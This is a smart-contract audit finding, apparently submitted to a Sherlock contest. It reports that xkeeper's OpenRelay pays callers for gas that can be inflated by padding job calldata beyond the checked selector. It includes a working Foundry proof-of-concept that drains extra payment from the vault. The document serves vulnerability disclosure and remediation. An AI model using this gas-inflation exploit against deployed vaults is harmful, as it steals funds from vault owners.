High Honey Scorpion

high

# Malicious caller can drain vault by inflating job payload

## Summary

A malicious caller can benefit from an increased payout by artificially inflating the calldata sent to the job, which is not validated beyond its selector.

## Vulnerability Detail

The OpenRelay works by measuring the gas used to execute the jobs. The caller is then rewarded based on this amount.

```solidity
// Execute the automation vault counting the gas spent
uint256 _initialGas = gasleft();
_automationVault.exec(msg.sender, _execData, new IAutomationVault.FeeData[](0));
uint256 _gasSpent = _initialGas - gasleft();

// Calculate the payment for the relayer
uint256 _payment = (_gasSpent + GAS_BONUS) * block.basefee * GAS_MULTIPLIER / BASE;
```

The caller, or selected fee receiver, is reimbursed with the spent gas, a bonus of 53000 units, plus a 20% on top of that.

When a job is executed, the vault checks that the caller is whitelisted, and that the selector is enabled for the job (address) given.

```solidity
// Check that the specific caller is approved to call the relay
if (!_approvedCallers[msg.sender].contains(_relayCaller) && !_approvedCallers[msg.sender].contains(_ALL)) {
  revert AutomationVault_NotApprovedRelayCaller();
}

// Create the exec data needed variables
ExecData memory _dataToExecute;
uint256 _dataLength = _execData.length;
uint256 _i;
bool _success;

// Iterate over the exec data to execute the jobs
for (_i; _i < _dataLength;) {
  _dataToExecute = _execData[_i];

  // Check that the selector is approved to be called
  if (!_approvedJobSelectors[msg.sender][_dataToExecute.job].contains(bytes4(_dataToExecute.jobData))) {
    revert AutomationVault_NotApprovedJobSelector();
  }
  (_success,) = _dataToExecute.job.call(_dataToExecute.jobData);
  if (!_success) revert AutomationVault_ExecFailed();

  // Emit the event
  emit JobExecuted(msg.sender, _relayCaller, _dataToExecute.job, _dataToExecute.jobData);

  unchecked {
    ++_i;
  }
}
```

However, there is no check on the calldata sent to the job (`jobData`) beyond its first 4 bytes. A malicious caller can simply append an arbitrary amount of bytes to the payload in order to inflate the calldata used in the call, artificially inflating as well the gas used in the operation. This doesn't conflict with the job execution itself, as any "excess" in the calldata will simply be ignored as long as the original arguments are there.

## Impact

Critical. A malicious caller can drain the vault when configured with OpenRelay, as they can artificially pump the gas used in the operation, and get away with the 20% bonus.

## Proof of Concept

The test reproduces a job execution comparing Bob, using the normal behavior, and the attacker, using the described vulnerability. Bob is paid 1653072000000000 while the attacker gets 4808832000000000 (using a base fee of 20 gwei), almost 3 times more by just appending a 10kb array in the `jobData`. The attacker can artificially grow this array as needed to drain the vault.

```solidity
/// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.19;

import {Test, console2 as console} from "forge-std/Test.sol";
import {AutomationVaultFactory} from "../contracts/core/AutomationVaultFactory.sol";
import {AutomationVault, IAutomationVault} from "../contracts/core/AutomationVault.sol";
import {GelatoRelay} from "../contracts/relays/GelatoRelay.sol";
import {OpenRelay} from "../contracts/relays/OpenRelay.sol";
import {_NATIVE_TOKEN, _ALL} from "../utils/Constants.sol";

contract DummyJob {
    uint256 public counter;

    constructor() {
        counter = 1;
    }

    function job(uint256 a, uint256 b) external {
        for (uint256 i = 0; i < 10; i++) {
            counter += a +  b;
        }
    }
}

contract SherlockTest is Test {
    AutomationVaultFactory factory;

    OpenRelay openRelay;

    address alice;
    address bob;
    address attacker;

    function setUp() public {
        factory = new AutomationVaultFactory();

        openRelay = new OpenRelay();

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        attacker = makeAddr("attacker");
    }

    function test_OpenRelay_InflateGas() public {
        vm.prank(alice);
        IAutomationVault vault = factory.deployAutomationVault(alice, _NATIVE_TOKEN, 0);

        DummyJob job = new DummyJob();

        // Configure OpenRelay
        address[] memory callers = new address[](1);
        callers[0] = _ALL;

        IAutomationVault.JobData[] memory jobs = new IAutomationVault.JobData[](1);
        jobs[0].job = address(job);
        jobs[0].functionSelectors = new bytes4[](1);
        jobs[0].functionSelectors[0] = DummyJob.job.selector;

        vm.prank(alice);
        vault.addRelay(address(openRelay), callers, jobs);

        // seed vault
        deal(address(vault), 1 ether);

        // take snapshot to compare both cases
        uint256 snapshotId = vm.snapshot();

        // test normal gas usage
        vm.startPrank(bob);

        assertEq(bob.balance, 0);

        IAutomationVault.ExecData[] memory execData = new IAutomationVault.ExecData[](1);
        execData[0].job = address(job);
        execData[0].jobData = abi.encodeWithSelector(DummyJob.job.selector, 420, 69);

        openRelay.exec(vault, execData, bob);

        uint256 bobPayment = bob.balance;
        console.log("Bob balance is:", bobPayment);

        vm.stopPrank();

        vm.revertTo(snapshotId);

        // test gas with attack
        vm.startPrank(attacker);

        assertEq(attacker.balance, 0);

        execData[0].job = address(job);
        // Inject dummy payload to artificially inflate gas usage
        bytes memory pad = new bytes(1024 * 10);
        execData[0].jobData = abi.encodeWithSelector(DummyJob.job.selector, 420, 69, pad);

        openRelay.exec(vault, execData, attacker);

        uint256 attackerPayment = attacker.balance;
        console.log("Attacker balance is:", attackerPayment);

        vm.stopPrank();

        assertGt(attackerPayment, bobPayment);
    }
}
```

## Code Snippet

https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/relays/OpenRelay.sol#L28-L34

## Tool used

Manual Review

## Recommendation

A direct mitigation could be to validate the length of the payload sent to the job. A better alternative would be to let the vault owner configure the max amount of gas willing to spend during job execution, so that the payment is bounded as well.
